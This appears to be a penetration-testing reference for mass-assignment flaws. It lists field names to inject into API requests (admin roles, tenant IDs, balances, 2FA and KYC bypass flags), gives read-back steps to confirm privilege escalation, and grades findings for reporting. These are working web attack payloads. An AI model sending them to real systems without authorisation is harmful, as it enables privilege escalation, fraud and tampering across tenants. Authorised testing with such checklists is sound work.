# Mass Assignment Field Corpus

Send these extra fields on every create/update of a user-visible object. One request
carries the whole corpus (the endpoint accepts what it binds and ignores the rest —
the read-back tells you which stuck).

## Privilege fields (the crown jewels)
`role`, `is_admin`, `admin`, `is_superuser`, `superuser`, `staff`, `moderator`,
`permissions`, `permission_ids`, `capabilities`, `role_id`, `group_id`, `is_verified`,
`verified`, `is_active`, `active`, `status`

## Ownership / tenant fields
`owner_id`, `user_id`, `account_id`, `tenant_id`, `org_id`, `company_id`, `team_id`,
`parent_id`

## Money / balance fields
`balance`, `credit`, `credits`, `points`, `price`, `amount`, `total`, `discount`,
`coupon_applied`, `paid`

## Bypass / state fields
`bypass_2fa`, `mfa_disabled`, `email_verified`, `phone_verified`, `kyc_approved`,
`trial_extended`, `subscription_tier`, `plan`

## How to prove it stuck (read-back)
1. `POST /api/users` (or the object's create) with `{"<normal fields>", "is_admin": true, "role": "admin"}`.
2. `GET /api/users/<new-id>` (as the creating actor) — does `is_admin: true` / `role: "admin"` come back?
3. If the object is the current user (`/api/me` update): read `/api/me` after.
4. If the API hides the field on read: test the **effect** — call an admin-gated endpoint
   as the new identity. The effect is the proof.

## Signal grading
| Signal | Grade |
|---|---|
| field echoed in create response | possible — need read-back |
| field persisted on read-back | **confirmed mass assignment** — report |
| field persisted AND effect observed (admin call works) | **confirmed privilege escalation** — report as critical/high |
| field silently dropped | clean for this field (record the count tried) |

## Notes
- Some stacks bind only declared fields (safe), some bind `map`/`Struct` by name (vulnerable).
- JSON key case: try `IsAdmin`, `isAdmin`, `is_Admin` if the stack is case-insensitive (some Java/.NET binders).
- Nested: `{"user": {"role": "admin"}}` — the binder may unwrap one level.
